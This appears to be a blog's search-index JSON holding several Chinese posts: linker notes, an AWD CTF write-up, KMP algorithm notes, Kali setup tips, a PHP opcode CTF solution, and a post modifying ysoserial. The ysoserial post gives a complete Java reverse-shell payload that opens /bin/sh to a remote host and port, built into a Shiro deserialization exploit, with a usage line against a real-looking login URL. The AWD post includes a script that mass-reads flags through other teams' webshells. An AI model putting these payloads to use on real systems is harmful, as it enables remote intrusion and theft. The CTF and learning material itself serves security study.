可执行目标文件格式通过前面知识的学习，我们了解到链接器主要完成了两个工作，符号解析和重新定义。将数据和代码合并成为一个可执行的文件，接下来我们看看这个可执行文件的格式是什么，以及如何加载到存储器中开始运行的过程。 ELF头部：描述文件总体格式，标注出程序入口点；.init：定义了初始化函数;段头部表：可执行文件是一个连续的片，段头部表中描述了这种映射关系； 动态链接共享库1、 编译时加载静态库需要定期的维护和更新，调用的代码还会拷贝到每个运行的进程中去，这是对存储器系统资源的极大浪费。为了弥补这样的缺陷，我们发明了共享库。共享库的一个主要目的就是允许多个正在运行的进程共享存储器中相同的库代码，节约资源。以(.so)结尾的文件，在运行时被加载到任意存储器地址，并和存储器中的程序链接起来，以后的进程要用到这个库就从这个固定的位置开始访问。这一过程的管理交由动态链接器程序来执行。2、运行时加载共享库微软的windows程序开发人员提供共享库来更新软件，通常要求下载最新的dll库，然后在程序下一次执行的时候会自动链接和加载更新后的共享库。我们创建dll.c文件，运行时加载libvector.so","link":"2018/12/21/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E9%93%BE%E6%8E%A5/"},{"title":"First_AWD","text":"昨儿参加金科awd，小菜鸡的第一次awd，记录一下过程呗。 一、现场感觉咋样？现场有西瓜吃，然后吃了一下午瓜，┭┮﹏┭┮，先说说网络配置按理说应该整一个网段扫描扫其他靶机的ip地址但是比赛方大致提供了网络分布图一共11只队伍,每只队伍4个人,一共三道题目（3个Web oRz oRz第n只队伍的A,B,C,D选手的ip分别是172.20.10n.1/2/3/4第n只队伍的web1,web2,web3的ip分别是172.20.10n.101/102/103规则为每半小时一轮，开局一轮只能防不能打，主办方每5分钟随机check一次靶机，如果宕机扣除比攻击更多的分 当然一般应该不会直接告诉你其他队ip地址，自己扫一扫就行，保存在ip_file.txt中，不同网段修改IpScan的网段即可 from scapy.all import srp, Ether, ARPimport reIpScan = &apos;192.168.1.1/24&apos;ip_file=open(&apos;ip_file.txt&apos;,&apos;w&apos;)try: ans,unans = srp(Ether(dst=&quot;FF:FF:FF:FF:FF:FF&quot;)/ARP(pdst=IpScan), timeout=2)except Exception as e: print(e)else: for send, rcv in ans: ListMACAddr = rcv.sprintf(&quot;%Ether.src%---%ARP.psrc%&quot;) print(ListMACAddr) Just_IP = rcv.sprintf(&quot;%ARP.psrc%\\n&quot;) ip_file.write(Just_IP);ip_file.close() 运维有点难受鸭，把不死马上了别个服务器，突然比赛停止分数和服务全部重置，尴尬！本次比赛三个flag都在各自服务器的根目录下，而且文件名是随机的，所以不仅要求有任意文件读能力，还得代码执行能力 二、获得了ip地址首先做了啥？开始其实没必要紧张，因为不是一开始就能被打，先半小时自己fix自己的服务器 1、登陆到ssh，修改密码本次比赛大家的服务器ip和自己的mac地址绑定了，比赛方提供的ssh密码都是默认的弱密码，一个是ctf一个是admin一个是123456，所以先上自己的服务区后修改自己的密码直接输入passwd,然后会让你先输入自己的旧密码，再输入两遍新密码。 2、dump源码这个真滴重要，因为确实作为运维不行的小辣鸡（指自己，一不小心服务器就挂了，当然还有就是以防别的队拿了shell搞事情，很内疚，因为操作失误，不小心删了别个主页，听我解释o((&gt;ω&lt; ))o！。 3、备份数据库3个web有2个用了mysql，233，密码都是弱密码，所以找到配置文件查看mysql修改密码，最好是备份一份在自己本地mysql修改密码 格式：mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;); 例子：mysql&gt; set password for root@localhost = password(&apos;123&apos;); 记得把服务里的代码也改一改 4、先找一句话木马先拿D盾扫一遍查杀比较简单的木马传送门，当然这个只是基本的，如果没扫到，可以试试找一找隐藏的webshell,之前一篇博客的启发python3多线程实例之批量检测webshell存活工具,最后面一个脚本需要你将源码放在本地，递归遍历每个文件，然后通过暴力测试能够找到隐藏的木马。 5、监控脚本由于第一打的小比赛，waf就没装了（说到底也没几个访问我们的服务器，嘤嘤嘤，上一个流量监控脚本 &lt;?phperror_reporting(0); define(&apos;LOG_FILEDIR&apos;,&apos;./logs&apos;); if(is_dir(LOG_FILEDIR))#echo &quot;has &quot;;else{mkdir(LOG_FILEDIR,0777,true);# echo &quot;Mkdir&quot;;}function waf() { if (!function_exists(&apos;getallheaders&apos;)) { function getallheaders() { foreach ($_SERVER as $name =&gt; $value) { if (substr($name, 0, 5) == &apos;HTTP_&apos;) $headers[str_replace(&apos; &apos;, &apos;-&apos;, ucwords(strtolower(str_replace(&apos;_&apos;, &apos; &apos;, substr($name, 5)))))] = $value; } return $headers; } } $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; $method = $_SERVER[&apos;REQUEST_METHOD&apos;]; $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;]; foreach ($_FILES as $key =&gt; $value) { $files[$key][&apos;content&apos;] = file_get_contents($_FILES[$key][&apos;tmp_name&apos;]); file_put_contents($_FILES[$key][&apos;tmp_name&apos;], &quot;virink&quot;); }unset($header[&apos;Accept&apos;]);$input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header);logging($input);}function logging($var){ $filename = $_SERVER[&apos;REMOTE_ADDR&apos;];$LOG_FILENAME = LOG_FILEDIR.&quot;/&quot;.$filename.&quot;.txt&quot;;$LOG_FILENAME_JustParam = LOG_FILEDIR.&quot;/&quot;.$filename.&quot;Just_param&quot;.&quot;.txt&quot;;#echo $LOG_FILENAME;$time = date(&quot;Y-m-d G:i:s&quot;);#echo &quot;\\n&quot;;#echo $filename;#echo &quot;\\n&quot;;file_put_contents($LOG_FILENAME, &quot;\\r\\n&quot;.$time.&quot;\\r\\n&quot;.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,&quot;\\r\\n&quot;.&apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;PHP_SELF&apos;].&apos;?&apos;.$_SERVER[&apos;QUERY_STRING&apos;], FILE_APPEND);file_put_contents($LOG_FILENAME,&quot;\\r\\n***************************************************************&quot;,FILE_APPEND);file_put_contents($LOG_FILENAME_JustParam, &quot;\\r\\n&quot;.$time,FILE_APPEND); file_put_contents($LOG_FILENAME_JustParam,&quot; &quot;.&apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;PHP_SELF&apos;].&apos;?&apos;.$_SERVER[&apos;QUERY_STRING&apos;], FILE_APPEND);}waf(); ?&gt; 然后你在其他文件加上require_once(&apos;waf.php&apos;);也可以拿一下命令所有php加上,源码和waf目录自己灵活一点变化 sudo find /var/www/html/&lt;path&gt; -type f -path &quot;*.php&quot; | xargs sed -i &quot;s/&lt;?php/&lt;?php\\nrequire_once(&apos;\\/tmp\\/waf.php&apos;);\\n/g&quot; 想象中是看别人的流量然后构造payload攻击其他人现实情况是，压根没几个人访问过我们的网站（估计是fix太狠了 6、当你能构造padload就可以批量攻击其他人了，不管别人修没修，从之前扫到的ip地址内读ip出来，打一下就完事了，处理好报错就行,比如请求的timeout设置小一点，不会那么卡import sysimport requestsip_list=[]flag_txt=open(&apos;flag.txt&apos;,&apos;w&apos;)#把文件里的ip地址转化成listwith open(&apos;ip_file.txt&apos;,&apos;r&apos;) as f: for line in f: ip_list.append(list(line.strip(&apos;\\n&apos;).split(&apos;,&apos;)))#print(ip_list);def get_flag(ip_str): url = &quot;http://&quot;+ip_str+&quot;/1.php?key=readfile(&apos;./flag.txt&apos;);&quot; print(url); try: s = requests.Session() source = s.get(url,timeout=1) if &quot;flag&quot; in source.text: flag_txt.write(source.text+&quot;\\n&quot;) print(url+&quot; hacked &quot;+source.text) else: print(url+&quot; Is error &quot;) except KeyError as e: print(&apos;键错误&apos;) except IndexError as e: print(&apos;索引错误&apos;) except TypeError as e: print(&apos;类型错误&apos;) except ValueError as e: print(&apos;值的类型错误&apos;) except requests.exceptions.RequestException as e: print(&apos;超时&apos;) except Exception as e: print(&apos;错误&apos;)for ip_addr in ip_list: ip_str=&apos;&apos;.join(str(i) for i in ip_addr) get_flag(ip_str)flag_txt.close() get_flag函数根据需求自己改，把flag保留在flag.txt的中批量提交 7、批量提交flag当对手太多了，可以写个批量提交脚本，orz本地提交系统居然有验证码？,提交需要提供别人flag个自己token，（当然也可能需要别人的ip，按需所取吧 import requestsjudge_url=&quot;http://192.168.1.114/1.php&quot;self_token=&quot;Hello_kitty&quot;flag_list=[]with open(&apos;flag.txt&apos;,&apos;r&apos;) as f: for line in f: flag_list.append(list(line.strip(&apos;\\n&apos;).split(&apos;,&apos;)))#print(flag_list) def post_rep(flag, token): param = { &apos;token&apos;: token, &apos;flag&apos;:flag } rep = requests.post(judge_url, data=param) #print(rep) print(&quot;send flag success &quot;+flag+rep.text)for flag in flag_list: rel_flag=&apos;&apos;.join(str(i) for i in flag) post_rep(rel_flag,self_token) 8、文件对比当你发现自己文件被动了手教可以使用软件对比哪里变化了，推荐软件BeyondCompare 网上可以找找破解版 题目就不点评了，只能说自己php和运维能力是真滴虚，暑假努力了运维小知识 php停止和重启（查杀不死马service php-fpm start 开启service php-fpm stop 停止service php-fpm restart 重启 Nginx启动 启动代码格式：nginx安装目录地址 -c nginx配置文件地址[root@LinuxServer sbin]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf nginx的停止有三种方式：1、查看进程号2、然后杀死 [root@LinuxServer ~]# ps -ef|grep nginx[root@LinuxServer ~]# kill -QUIT 2072 强制停止 [root@LinuxServer ~]# pkill -9 nginx 重启进入nginx安装目录sbin下，输入命令./nginx -t看到如下显示nginx.conf syntax is oknginx.conf test is successful 进入nginx可执行目录sbin下，输入命令**./nginx -s reload** 即可或者查找当前nginx进程号，然后输入命令：kill -HUP 进程号 实现重启nginx服务 Apache基本的操作方法： 假设你的apahce安装目录为/usr/local/apache2，这些方法适合任何情况apahce启动命令：推荐/usr/local/apache2/bin/apachectl start apaceh启动apache停止命令/usr/local/apache2/bin/apachectl stop 停止apache重新启动命令：/usr/local/apache2/bin/apachectl restart 重启要在重启 Apache 服务器时不中断当前的连接，则应运行：/usr/local/sbin/apachectl graceful如果apache安装成为linux的服务的话，可以用以下命令操作：service httpd start 启动service httpd restart 重新启动service httpd stop 停止服务 mysql 备份[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysqldump -u root -p Test&gt;Test0809.sql，输入密码即可。 还原法一：[root@localhost ~]# mysql -u root -p 回车，输入密码，进入MySQL的控制台&quot;mysql&gt;&quot;，输入命令&quot;show databases；&quot;。 看看有些什么数据库； 建立你要还原的数据库，输入&quot;create database voice；&quot;，切换到刚建立的数据库，输入&quot;use voice；&quot;，回车；导入数据，输入&quot;source voice.sql；&quot;，回车，开始导入，再次出现&quot;mysql&gt;&quot;并且没有提示错误即还原成功。[root@localhost ~]# cd /var/lib/mysql (进入到MySQL库目录，根据自己的MySQL的安装情况调整目录)[root@localhost mysql]# mysql -u root -p Test&lt;Test0809.sql，输入密码即可（将要恢复的数据库文件放到服务器的某个目录下，并进入这个目录执行以上命令|）。moodle_bak.sql是需要恢复的文件名 ping 探测内网机器存活for /l %i in (1,1,255) do ping -n 1 -w 60 192.168.1.%i | find &quot;TTL&quot;","link":"2019/06/17/First-AWD/"},{"title":"JAVA4-改写ysoserial解决常规shell失效问题","text":"最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了改动的仓库https://github.com/Kit4y/shuyu-ysoserial打包版本https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu 为什么之前打不通？两次项目均是这种情况，可以出网，可以反弹shell,但是命令执行就是没有回显 在前文中，我们捋了一下yso项目的结构JAVA3-ysoserial调试和构造URLDNS的pop链,再看一下yso的项目框架 │ GeneratePayload.java {{生成poc的入口函数}}│ Deserializer.java {{反序列化模块}}│ Serializer.java {{序列化模块}}│ Strings.java {{字符处理模块}}│├─exploit {{一些直接调用的exp}}│ JBoss.java│ JenkinsCLI.java│ JenkinsListener.java│ ......│ ├─payloads {{生成gadget poc的代码}}│ │ CommonsBeanutils1.java│ │ URLDNS.java│ │ .....│ ││ ├─annotation {{一些不重要的配置}}│ │ Authors.java│ ││ └─util {{一些重复使用的单元}}│ ClassFiles.java│ Gadgets.java│└─secmgr {{和安全有关的管理}} DelegateSecurityManager.java ExecCheckingSecurityManager.java 通过点追踪，我们找命令执行的拼接片段在ysoserial\\payloads\\util\\ Gadgets.java命令是通过 String cmd=&quot;java.lang.Runtime.getRuntime().exec(\\&quot;&quot; + command.replaceAll(&quot;\\\\\\\\&quot;,&quot;\\\\\\\\\\\\\\\\&quot;).replaceAll(&quot;\\&quot;&quot;, &quot;\\\\\\&quot;&quot;) + &quot;\\&quot;);&quot;; 也就是https://github.com/Kit4y/shuyu-ysoserial/blob/master/src/main/java/ysoserial/payloads/util/Gadgets.java这里的120行左右拼接，然后作者在代码上注释了一行有意思的话 // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections 很明白了，我们可以改成自己的纯java的片段，简直为所欲为，所以我们也打算对他下手了。 java原生Socket_shell这个不多说网上都有,这里为了反序列化，将所有的函数写上完整的包路径，比如java.net.Socket,java.io.IOException public class rce { public static void main(String[] args) throws java.io.IOException, InterruptedException { String host=&quot;XXX.XXX.XXX.XXX&quot;; int port=7777; String cmd=&quot;/bin/sh&quot;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); java.net.Socket s=new java.net.Socket(host,port); java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()&gt;0) { so.write(pi.read()); } while(pe.available()&gt;0) { so.write(pe.read()); } while(si.available()&gt;0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){ } }; p.destroy(); s.close(); }} 可以编译运行一下测试 植入代码问题(如果只看结果可以跳过这一段)因为这是java,理论上直接讲我们socket的shell换行符删除，应该就能直接运行于是将cmd改成暂时写死的的反弹shell代码片 cmd=&quot; String host=\\&quot;XXX.XXX.XXX.XXX\\&quot;;int port=7777;String cmd=\\&quot;/bin/sh\\&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()&gt;0) {so.write(pi.read());}while(pe.available()&gt;0) {so.write(pe.read());}while(si.available()&gt;0) {po.write(si.read());}so.flush();po.flush();try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();&quot; 果不其然直接报错看了很久这个报错，问了一下师傅（Orz长亭师傅是真的顶原因在ProcessBuilder的构造报错说[source error] cannot find constructor java.lang.ProcessBuilder(java.lang.String)意味着字符串当参数就不能反序列化了，我们查看ProcessBuilder源码 /** * Constructs a process builder with the specified operating * system program and arguments. This is a convenience * constructor that sets the process builder&apos;s command to a string * list containing the same strings as the {@code command} * array, in the same order. It is not checked whether * {@code command} corresponds to a valid operating system * command. * * @param command a string array containing the program and its arguments */public ProcessBuilder(String... command) { this.command = new ArrayList&lt;&gt;(command.length); for (String arg : command) this.command.add(arg);} 原来这里应该改成字符串数组，于是我们可以把 String cmd=&quot;/bin/sh&quot;;改成String[] cmd=new String[]{\\&quot;/bin/sh\\&quot;}(军先师傅tql,还有一个是Thread.sleep(50);也报错了，我们先直接删除 然后重新mvn打包-生成ysoserial.jar打一下试试 jar ：mvn clean install -Dmaven.test.skip=truewar：mvn clean package -Dmaven.test.skip=true ok-成功打通了！ 优化现在我们只要把ip和端口写活着即可,因为暂时不想改整体框架的内容，就直接将command改了一下-懒癌是这样的，随手一改 String[] cmds = command.split(&quot; &quot;);String ip=cmds[0];String port=cmds[1];String cmd=&quot;String host=\\&quot;&quot;+ip+&quot;\\&quot;;int port=&quot;+port+&quot;;String[] cmd=new String[]{\\&quot;/bin/sh\\&quot;};Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s=new java.net.Socket(host,port);java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()&gt;0) {so.write(pi.read());}while(pe.available()&gt;0) {so.write(pe.read());}while(si.available()&gt;0) {po.write(si.read());}so.flush();po.flush();try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();&quot;; https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu尝试运行一下python3 shiro_rce.py http://www.baidu.com/login.do &quot;xxx.xxx.xx.xx 7777&quot; 感触学习java项目，研究源码是最直接最深触的学习途径，比去什么垃圾教程上看好多了。不仅可以看到项目如何跑，还能膜一下大佬们怎么写优雅的代码。通过修改源码改成自己顺手的工具也是一个不错的学习过程。Orz长亭师傅tql","link":"2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"},{"title":"KMP浅显证明一波","text":"一、KMP的背景KMP算法是一种改进的字符串匹配算法，由D.E.Knuth，J.H.Morris和V.R.Pratt同时发现因此人们称它为克努特——莫里斯——普拉特操作（简称KMP算法）。KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。具体实现就是实现一个next()函数，函数本身包含了模式串的局部匹配信息。时间复杂度O(m+n)。from –百度百科 二、KMP解决的问题2.1 KMP算法要解决的问题就是在字符串（也叫主串）中的模式（pattern）定位问题。说简单点就是我们平时常说的关键字搜索。模式串就是关键字（接下来称它为P），如果它在一个主串（接下来称为T）中出现，就返回它的具体位置，否则返回-1（常用手段）。 2.2、假设现在我们需要观察”hello”字符串与”213helldshello”是否匹配采用传统的暴力法如下所示 int main(int argc, const char * argv[]){ //观察&quot;hello&quot;字符串与&quot;213helldshello&quot;是否匹配 string dStr = &quot;213helldshehello&quot;; string keyStr = &quot;hello&quot;; for (decltype(dStr.size()) i = 0; i &lt; (dStr.size() - keyStr.size()); ++i) { for (auto j = i; j &lt; (keyStr.size() + i); ++j) { //开始匹配字符 if (dStr.at(j) != keyStr.at(j)) { //如果不匹配,就终止当前循环 break; } if (j == (keyStr.size() + i - 1)){ //如果最后一个字符也匹配成功,就输出匹配成功 cout &lt;&lt; &quot;匹配成功&quot; &lt;&lt; endl; return 0; } } } cerr &lt;&lt; &quot;匹配失败&quot;; return -1;} 2.3、核心问题所在一旦匹配失败，将要重头匹配，导致复杂度升高（主要是逼格低，所以kmp的核心思想是“利用已经部分匹配这个有效信息，保持i指针不回溯，通过修改j指针，让模式串尽量地移动到有效的位置”（别挣扎了，这句话光看是看不懂了，跳过往下看吧 三、KMP简单实现3.1、getNext()当此次匹配失败后,下一次不从下一个重新匹配,而是根据前面的匹配信息选择平移一段距离来匹配,具体平移多长的距离,由getNext()方法来决定.所以接下来我们要讨论到底要移动多长合适观察如下匹配 213kittzshellokitty kitty 我们可以发现到这里的时候,只有前4位匹配成功,根据之前所说的平移,那我们要决定平移多少合适这么一看,我们完全可以平移4位接着匹配.所以是不是成功匹配多少，就移位多少呢？很巧，不是的，瞧下面一个例子 kkkkkittykkkki 这个时候我们同样发现前4个是匹配的,但是只有匹配一个位就合适了所以核心问题是解决要移动几个位 3.2、公共前后缀&amp;&amp;getNext（）我们观察匹配到的字符串,即如上面的kkkki,他匹配到kkkk时发现剩下的h不匹配,此时他的最大匹配串就是kkkk.然后我们观察他的首尾有最多几个一样的字符串.比如aba 首位的a和末尾的a相同 所以最大公共前后缀的就是1asdasc 这种字符串找不到首位匹配的,所以最大公共前后缀为0.asdas 首位的as 相同 所以最大公共前后缀就是2.这种做法有什么意义呢,当我们发现字符串的长度是n的时候,如果他的公共前后缀长度为0,那么我们就平移他的长度n(n-0=n)getNext返回值是（公共匹配长度-最大公共前后缀）最大公共前后缀其实可以总结为next数组，思想一样，只是算法不同 3.3、浅显证明一下（不是很严谨，只是希望能够记住我们要匹配 kittittyhelloworldkitty 开始匹配时,发现前4位是正好匹配的,他的公共匹配是kitt我们发现他的公共前后缀长度是0,所以这个时候我们平移4位.现在假设我们这样的做法是错误的，其实移动三格就能匹配到（这是假设 kittittyhelloworld kitty 如果假设要成立，那么原字符串的第四位一定是k才能匹配到kitty即公共匹配的4位是kitk,最大公共前后缀为1,所以就应该平移3位,刚好对应我们的假设（不知道听懂了没，全跟着感觉走咯） 四、算法4.1、实现getNext（）int getNext(string maxStr){ int length = maxStr.size();//存放字符串的长度 string str1; string str2; int subLen = 0; for (int i = 1 ; i &lt; length; ++i) {//截取两段字符串 str1 = maxStr.substr(0,i); str2 = maxStr.substr(length-i,length); if(str2 == str1){//比较 subLen = i; } } return length - subLen;//此地用的不是next数组，其实subLen可以用以计算next数组} 4.2、主函数int main(){ /* 目标字符串:HelloworldiamKittyihiahiahia 匹配字符串:Kitty */ string deStr(&quot;HelloworldiamKittyihiahiahia&quot;); string keyStr(&quot;Kitty&quot;); //1.先匹配,找到匹配到的公共最大匹配串,需要一个字符串maxStr来保存 string maxStr(&quot;&quot;); int steps; int length; //用于循环中计算当前长度 //2.开始匹配 for (int i = 0; i &lt; (deStr.size() - keyStr.size());) { length = 0;//每次重新搜索都把length置0 steps = 1;//每次平移一段距离都重新计算平移的距离 for (int j = i; j &lt; (keyStr.size() + i); ++j) { if (deStr.at(j) != keyStr.at(j-i)) { if ( length &gt; 1) { maxStr = keyStr.substr(0,length); //*************** steps = getNext(maxStr); //这里需要一个函数,来告诉我们每次需要跳过多少次 //*************** } break; //如果当前循环不一致则结束循环 } ++length; //匹配成功字符串长度加1 if (length == keyStr.size()){ cout &lt;&lt; &quot;匹配成功&quot; &lt;&lt; endl; cout&lt;&lt;&quot;匹配成功第一次的第一个字符的下标为：&quot;&lt;&lt;i&lt;&lt;endl; return 0; } } i += steps; } cout &lt;&lt; &quot;匹配不成功&quot;; return -1;}","link":"2019/01/06/KMP%E6%B5%85%E6%98%BE%E8%AF%81%E6%98%8E%E4%B8%80%E6%B3%A2/"},{"title":"Kali的一些坑","text":"一、安装Kali双系统的坑不知道有没有人安装kali双系统的时候遇到这个从光盘上读取数据出错，请确认光盘已被放置在驱动器中，如果重试以后开始无法工作，请检查光盘完整性，无法从光盘上拷贝文件，要重试吗,重试就在这里了，不重试只能退出 问题所在使用软碟通烧启动盘的时候写入方式为RAW能解决！！亲测 二、Kali虚拟机安装后黑屏打不开emm，然后虚拟机有炸了，果然还是要看看教程，自己闯就有很多问题主要的问题是下面的2个选择，我默认回车了，然后GG 切记：都选是！！虽然默认是否 三、Kali换源和虚拟机装了vm还不能复制文件？我也很无奈鸭，装了vmtools也不行复制粘贴,1.编辑源 vi /etc/apt/sources.list 2.新增如下源 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb http://mirrors.aliyun.com/kali kali main non-free contrib deb-src http://mirrors.aliyun.com/kali kali main non-free contrib deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free 3.按照官方文档。 apt-get updateapt-get install open-vm-tools-desktop fusereboot 4.有一说一，确实有效","link":"2019/11/19/Kali%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"},{"title":"PHP内核","text":"目前编程语言可以分为两大类:第一类是像C/C++， .NET， Java之类的编译型语言， 它们的共性是: 运行之前必须对源代码进行编译，然后运行编译后的目标文件。 第二类比如:PHP， Javascript， Ruby， Python这些解释型语言， 他们都无需经过编译即可”运行”，虽然可以理解为直接运行 但它们并不是真的直接就被能被机器理解， 机器只能理解机器语言，那这些语言是怎么被执行的呢， 一般这些语言都需要一个解释器， 由解释器来执行这些源码， 实际上这些语言还是会经过编译环节， 只不过它们一般会在运行的时候实时进行编译。为了效率，并不是所有语言在每次执行的时候都会重新编译一遍， 比如PHP的各种opcode缓存扩展(如APC， xcache， eAccelerator等)，比如Python会将编译的中间文件保存成pyc/pyo文件， 避免每次运行重新进行编译所带来的性能损失。 PHP的脚本的执行也需要一个解释器， 比如命令行下的php程序，或者apache的mod_php模块等等假设上面的代码保存在名为hello.php的文件中， 用PHP命令行程序执行这个脚本： $ php ./hello.php 这段代码的输出显然是Hello， Tipi!， 那么在执行脚本的时候PHP/Zend都做了些什么呢？即:词法分析 =&gt; 语法分析 =&gt; opcode(中间代码)编译 =&gt;Zend Engineer 执行而opcode是php语言里供zend引擎执行的一种中间代码，类似java中的字节码、或者python中的字节码对象pycodeobject.产生命令行 php -dvld.active=1 t.php 题目“百度杯”CTF比赛 十月场 Vld内容为是do you know Vulcan Logic Dumper?查看源码获得index.php.txt-呜呜呜 开始做逆向了翻译本在这https://www.php.net/manual/en/internals2.opcodes.php Finding entry pointsBranch analysis from position: 0Jump found. Position 1 = 23, Position 2 = 38Branch analysis from position: 23Jump found. Position 1 = 26, Position 2 = 35Branch analysis from position: 26Jump found. Position 1 = 29, Position 2 = 32Branch analysis from position: 29Jump found. Position 1 = 34Branch analysis from position: 34Jump found. Position 1 = 37Branch analysis from position: 37Jump found. Position 1 = 40Branch analysis from position: 40Return foundBranch analysis from position: 32Jump found. Position 1 = 37Branch analysis from position: 37Branch analysis from position: 35Jump found. Position 1 = 40Branch analysis from position: 40Branch analysis from position: 38Return foundfilename: C:\\ctf\\index.phpfunction name: (null)number of ops: 44compiled vars: !0 = $a, !1 = $b, !2 = $cline # * op fetch ext return operands--------------------------------------------------------------------------------- 2 0 &gt; EXT_STMT 1 ECHO &apos;do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E&apos; 3 2 EXT_STMT 3 BEGIN_SILENCE ~0 4 FETCH_R global $1 &apos;_GET&apos; 5 FETCH_DIM_R $2 $1, &apos;flag1&apos; 6 END_SILENCE ~0 7 ASSIGN !0, $2 4 8 EXT_STMT 9 BEGIN_SILENCE ~4 10 FETCH_R global $5 &apos;_GET&apos; 11 FETCH_DIM_R $6 $5, &apos;flag2&apos; 12 END_SILENCE ~4 13 ASSIGN !1, $6 5 14 EXT_STMT 15 BEGIN_SILENCE ~8 16 FETCH_R global $9 &apos;_GET&apos; 17 FETCH_DIM_R $10 $9, &apos;flag3&apos; 18 END_SILENCE ~8 19 ASSIGN !2, $10 6 20 EXT_STMT 21 IS_EQUAL ~12 !0, &apos;fvhjjihfcv&apos; 22 &gt; JMPZ ~12, -&gt;38 7 23 &gt; EXT_STMT 24 IS_EQUAL ~13 !1, &apos;gfuyiyhioyf&apos; 25 &gt; JMPZ ~13, -&gt;35 8 26 &gt; EXT_STMT 27 IS_EQUAL ~14 !2, &apos;yugoiiyhi&apos; 28 &gt; JMPZ ~14, -&gt;32 9 29 &gt; EXT_STMT 30 ECHO &apos;the+next+step+is+xxx.zip&apos; 10 31 &gt; JMP -&gt;34 11 32 &gt; EXT_STMT 33 ECHO &apos;false%3Cbr%3E&apos; 13 34 &gt; &gt; JMP -&gt;37 14 35 &gt; EXT_STMT 36 ECHO &apos;false%3Cbr%3E&apos; 16 37 &gt; &gt; JMP -&gt;40 17 38 &gt; EXT_STMT 39 ECHO &apos;false%3Cbr%3E&apos; 19 40 &gt; NOP 22 41 EXT_STMT 42 ECHO &apos;%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A&apos; 43 &gt; RETURN 1branch: # 0; line: 2- 6; sop: 0; eop: 22; out1: 23; out2: 38branch: # 23; line: 7- 7; sop: 23; eop: 25; out1: 26; out2: 35branch: # 26; line: 8- 8; sop: 26; eop: 28; out1: 29; out2: 32branch: # 29; line: 9- 10; sop: 29; eop: 31; out1: 34branch: # 32; line: 11- 13; sop: 32; eop: 33; out1: 34branch: # 34; line: 13- 13; sop: 34; eop: 34; out1: 37branch: # 35; line: 14- 16; sop: 35; eop: 36; out1: 37branch: # 37; line: 16- 16; sop: 37; eop: 37; out1: 40branch: # 38; line: 17- 19; sop: 38; eop: 39; out1: 40branch: # 40; line: 19- 22; sop: 40; eop: 43path #1: 0, 23, 26, 29, 34, 37, 40,path #2: 0, 23, 26, 32, 34, 37, 40,path #3: 0, 23, 35, 37, 40,path #4: 0, 38, 40,do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt; 逆向结果 &lt;?php echo &apos;do you know Vulcan Logic Dumper?&lt;br&gt;&apos;; $a=$_GET[&apos;flag1&apos;]; $b=$_GET[&apos;flag2&apos;]; $c=$_GET[&apos;flag3&apos;]; if($a!=&apos;fvhjjihfcv&apos;) { echo &apos;false&lt;br&gt;&apos;; } elseif($b!=&apos;gfuyiyhioyf&apos;) { echo &apos;false&lt;br&gt;&apos;; } elseif($c!=&apos;yugoiiyhi&apos;) { echo &apos;false&lt;br&gt;&apos;; } else { echo &apos;the next step is xxx.zip&apos;; } echo &apos;&lt;!-- index.php.txt ?&gt;&apos;;?&gt; poc http://d0705cd371b64926bff52061f6c2483e4d1297d84f964ae2.changame.ichunqiu.com/?flag1=fvhjjihfcv&amp;flag2=gfuyiyhioyf&amp;flag3=yugoiiyhi","link":"2019/12/04/PHP%E5%86%85%E6%A0%B8/"},{"title":"PHP文档的一些笔记","text":"1.php短标记PHP 也允许使用短标记 